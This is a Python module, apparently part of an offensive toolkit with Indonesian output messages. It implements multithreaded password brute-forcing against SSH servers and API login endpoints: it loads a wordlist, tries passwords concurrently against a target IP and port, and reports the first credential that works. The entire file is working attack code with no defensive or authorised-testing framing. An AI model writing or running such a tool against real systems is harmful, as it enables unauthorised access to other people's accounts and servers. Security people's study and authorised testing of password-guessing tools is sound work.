import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from .utils import (
    info, ok, warn, error, section,
    GREEN, RED, YELLOW, CYAN, RST, BOLD, DIM
)
from .cred_test import try_ssh, try_api, load_wordlist


def bruteforce_ssh(ip, port, username, wordlist_file="common_passwords.txt", max_threads=5):
    section(f"SSH BRUTE FORCE: {ip}:{port}")
    info(f"Username: {username}")

    passwords = []
    raw = load_wordlist(wordlist_file)
    for u, p in raw:
        if u == username:
            passwords.append(p)
    passwords = list(dict.fromkeys(passwords))

    if not passwords:
        passwords = [p for _, p in raw]

    info(f"Wordlist: {len(passwords)} password dimuat.")
    print()

    tested = 0
    lock = threading.Lock()
    found = None

    def try_pass(pwd):
        nonlocal found
        if found:
            return
        result = try_ssh(ip, port, username, pwd, timeout=4)
        with lock:
            nonlocal tested
            tested += 1
            if result is True:
                found = pwd
        return result

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(try_pass, p): p for p in passwords}
        for future in as_completed(futures):
            if found:
                for f in futures:
                    f.cancel()
                break

    print()
    if found:
        ok(f"PASSWORD DITEMUKAN: {username}:{found}")
        return {"username": username, "password": found, "service": "SSH"}
    else:
        warn("Password tidak ditemukan dalam wordlist.")
        return None


def bruteforce_api(ip, port, username, wordlist_file="common_passwords.txt", max_threads=5):
    section(f"API BRUTE FORCE: {ip}:{port}")
    info(f"Username: {username}")

    passwords = []
    raw = load_wordlist(wordlist_file)
    for u, p in raw:
        if u == username:
            passwords.append(p)
    passwords = list(dict.fromkeys(passwords))

    if not passwords:
        passwords = [p for _, p in raw]

    info(f"Wordlist: {len(passwords)} password dimuat.")
    print()

    tested = 0
    lock = threading.Lock()
    found = None

    def try_pass(pwd):
        nonlocal found
        if found:
            return
        result = try_api(ip, port, username, pwd, timeout=4)
        with lock:
            nonlocal tested
            tested += 1
            if result:
                found = pwd
        return result

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(try_pass, p): p for p in passwords}
        for future in as_completed(futures):
            if found:
                for f in futures:
                    f.cancel()
                break

    print()
    if found:
        ok(f"PASSWORD DITEMUKAN: {username}:{found}")
        return {"username": username, "password": found, "service": "API"}
    else:
        warn("Password tidak ditemukan dalam wordlist.")
        return None
